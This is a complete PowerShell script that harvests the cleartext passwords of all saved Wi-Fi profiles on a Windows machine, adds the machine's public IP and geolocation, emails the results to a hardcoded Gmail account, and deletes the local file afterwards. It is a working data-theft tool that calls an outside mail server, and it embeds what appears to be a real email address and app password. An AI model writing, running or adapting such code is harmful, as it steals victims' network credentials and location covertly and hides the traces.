# wifi_info.ps1

# === Step 1: Setup ===
$computerName = $env:COMPUTERNAME
$outputFile = "$env:TEMP\$computerName.txt"

# === Step 2: Collect Wi-Fi Profiles ===
"Computer Name: $computerName" | Out-File -FilePath $outputFile -Encoding UTF8
"=============================" | Out-File -Append -FilePath $outputFile

$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

foreach ($profile in $wifiProfiles) {
    Add-Content $outputFile "`nWi-Fi Profile: $profile"
    $details = netsh wlan show profile name="$profile" key=clear
    $password = ($details | Select-String "Key Content").ToString()
    if ($password) {
        $passVal = ($password -split ":")[1].Trim()
        Add-Content $outputFile "Password: $passVal"
    } else {
        Add-Content $outputFile "Password: Not Found"
    }
}

# === Step 3: Get IP-based Location ===
try {
    $location = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    Add-Content $outputFile "`n===== Location Info ====="
    Add-Content $outputFile "Public IP: $($location.query)"
    Add-Content $outputFile "City: $($location.city)"
    Add-Content $outputFile "Region: $($location.regionName)"
    Add-Content $outputFile "Country: $($location.country)"
    Add-Content $outputFile "Latitude: $($location.lat)"
    Add-Content $outputFile "Longitude: $($location.lon)"
    Add-Content $outputFile "Google Maps: https://www.google.com/maps?q=$($location.lat),$($location.lon)"
} catch {
    Add-Content $outputFile "`n[!] Location fetch failed."
}

# === Step 4: Email Send ===

# Gmail credentials (use App Password, not normal Gmail password)
$EmailFrom = "aaahussain1806@gmail.com"
$EmailTo = "aaahussain1806@gmail.com"
$Subject = "Wi-Fi + Location Info from $computerName"
$Body = "Attached is the Wi-Fi and Location information file."
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$FileAttachment = $outputFile

# IMPORTANT: Using Gmail App Password
$securePassword = ConvertTo-SecureString "pzwshtkzmsfxtywt" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($EmailFrom, $securePassword)

Send-MailMessage -From $EmailFrom -To $EmailTo -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $cred -Attachments $FileAttachment

# === Step 5: Delete file from user system
Remove-Item $outputFile -Force
